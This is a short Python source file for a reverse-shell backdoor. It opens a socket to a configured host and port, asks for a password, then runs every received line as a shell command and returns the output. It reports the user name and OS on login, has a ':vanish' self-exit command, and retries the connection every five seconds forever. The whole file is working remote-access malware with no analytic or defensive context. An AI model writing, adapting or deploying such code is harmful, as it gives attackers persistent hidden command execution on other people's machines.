import socket
import subprocess
import time
import os

class Backdoor(object):
    def __init__(self, host, port, passwd):
        self.__host = host
        self.__port = port
        self.__passwd = passwd
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __execute_code(self, code):
        proc = subprocess.Popen(
            code,
            shell = True,
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE)

        stdout = proc.stdout.read().decode()
        stderr = proc.stderr.read().decode()
        out = stdout
        if stderr != '':
            out = stderr
        return out

    def login_loop(self):
        while True:
            self.__sock.send('Login: '.encode())
            passwd = self.__sock.recv(1024).decode().strip()
            if passwd == ':vanish':
                os._exit(0)
            if self.__passwd == passwd:
                return True

    def cmd_loop(self):
        while True:
            self.__sock.send('#>'.encode())
            data = self.__sock.recv(1024).decode().strip()

            if data == ':vanish':
                os._exit(0)
            
            out = self.__execute_code(data)
            self.__sock.send(out.encode())

    def open(self):
        self.__sock.connect((self.__host, self.__port))
        if not self.login_loop():
            return
        
        remote_login = self.__execute_code('whoami').strip()
        remote_os = self.__execute_code('uname -a').strip()

        welcome = '\n'.join([
            'Logged in into remote shell.',
            '\n',
            'Remote login name: ' + remote_login,
            'OS: ' + remote_os,
            '\n',
        ])
        self.__sock.send(welcome.encode())
        self.cmd_loop()


if __name__ == '__main__':
    while True:
        try:
            Backdoor('127.0.0.1', 8080, 'sys').open()
        except:
            time.sleep(5)
